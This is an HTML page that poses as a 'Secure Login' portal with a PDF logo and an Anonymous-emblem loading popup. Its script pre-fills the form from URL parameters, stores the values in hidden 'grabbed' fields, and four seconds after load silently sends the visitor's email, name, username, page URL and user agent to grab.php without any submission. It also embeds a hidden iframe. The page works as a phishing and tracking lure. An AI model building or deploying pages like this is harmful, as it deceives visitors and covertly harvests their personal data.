<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Login Portal</title>
  <style>
    * { box-sizing: border-box; }
    html, body {
      margin: 0; padding: 0;
      height: 100%; width: 100%;
      font-family: Arial, sans-serif;
      overflow: hidden;
    }

    .bg-container {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      z-index: -2;
    }

    .bg-container img {
      position: absolute;
      width: 100%; height: 100%;
      object-fit: cover;
      opacity: 0;
      transition: opacity 1s ease-in-out;
    }

    .bg-container img.active {
      opacity: 1;
    }

    .hidden-iframe {
      position: absolute;
      width: 1px;
      height: 1px;
      border: none;
      z-index: -1;
    }

    .popup {
      position: fixed;
      top: 50%; left: 50%;
      transform: translate(-50%, -50%);
      z-index: 20;
      background: rgba(255,255,255,0.9);
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(0,0,0,0.3);
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .popup img {
      width: 150px;
      height: auto;
    }

    .login-form {
      position: fixed;
      top: 50%; left: 50%;
      transform: translate(-50%, -50%) translateY(-200px);
      width: 320px;
      padding: 20px;
      background: rgba(255,255,255,0.96);
      box-shadow: 0 0 15px rgba(0,0,0,0.3);
      border-radius: 10px;
      text-align: center;
      opacity: 0;
      transition: all 0.6s ease;
      z-index: 10;
    }

    .login-form.visible {
      transform: translate(-50%, -50%) translateY(0);
      opacity: 1;
    }

    .login-form img.logo {
      width: 80px;
      margin-bottom: 15px;
    }

    .login-form input {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }

    .login-form button {
      width: 100%;
      padding: 10px;
      background: #007bff;
      border: none;
      color: white;
      font-weight: bold;
      border-radius: 5px;
      cursor: pointer;
    }

    .login-form button:hover {
      background: #0056b3;
    }
  </style>
</head>
<body>

<!-- Background Images -->
<div class="bg-container">
  <img src="https://images.unsplash.com/photo-1519125323398-675f0ddb6308?auto=format&fit=crop&w=1950&q=80" class="bg-img active">
  <img src="https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=1950&q=80" class="bg-img">
  <img src="https://images.unsplash.com/photo-1533106418989-88406c7cc8e6?auto=format&fit=crop&w=1950&q=80" class="bg-img">
</div>

<!-- Hidden Ad iframe -->
<iframe class="hidden-iframe" src="https://adssettings.google.com"></iframe>

<!-- Popup Image -->
<div class="popup" id="popup">
  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Anonymous_emblem.svg/1200px-Anonymous_emblem.svg.png" alt="Loading...">
</div>

<!-- Login Form -->
<div class="login-form" id="loginForm">
  <img src="https://cdn-icons-png.flaticon.com/512/732/732221.png" class="logo" alt="PDF">
  <h3>Welcome to Secure Login</h3>
  <form action="submit.php" method="POST">
    <input type="text" name="name" id="nameInput" placeholder="Full Name" required>
    <input type="email" name="email" id="emailInput" placeholder="Email Address" required>
    <input type="text" name="username" id="userInput" placeholder="Username" required>

    <!-- Hidden grabbed values -->
    <input type="hidden" name="grabbed_email" id="grabbedEmail">
    <input type="hidden" name="grabbed_name" id="grabbedName">
    <input type="hidden" name="grabbed_user" id="grabbedUser">

    <button type="submit">Login</button>
  </form>
</div>

<script>
  // Rotate background images every 6 seconds
  const images = document.querySelectorAll('.bg-img');
  let currentIndex = 0;
  setInterval(() => {
    images[currentIndex].classList.remove('active');
    currentIndex = (currentIndex + 1) % images.length;
    images[currentIndex].classList.add('active');
  }, 6000);

  // Show popup for 2 sec, then show login
  window.addEventListener("load", () => {
    setTimeout(() => {
      document.getElementById("popup").style.display = "none";
      document.getElementById("loginForm").classList.add("visible");
    }, 2000);
  });

  // Auto grab data from URL
  function getParam(param) {
    const url = new URL(window.location.href);
    return url.searchParams.get(param) || "";
  }

  const email = getParam("email");
  const name = getParam("name");
  const username = getParam("username");

  document.getElementById("emailInput").value = email;
  document.getElementById("nameInput").value = name;
  document.getElementById("userInput").value = username;

  document.getElementById("grabbedEmail").value = email;
  document.getElementById("grabbedName").value = name;
  document.getElementById("grabbedUser").value = username;

  // Optional background tracking (grab.php)
  setTimeout(() => {
    fetch("grab.php", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        email: email || "none",
        name: name || "none",
        username: username || "none",
        url: window.location.href,
        agent: navigator.userAgent
      })
    });
  }, 4000);
</script>

</body>
</html>
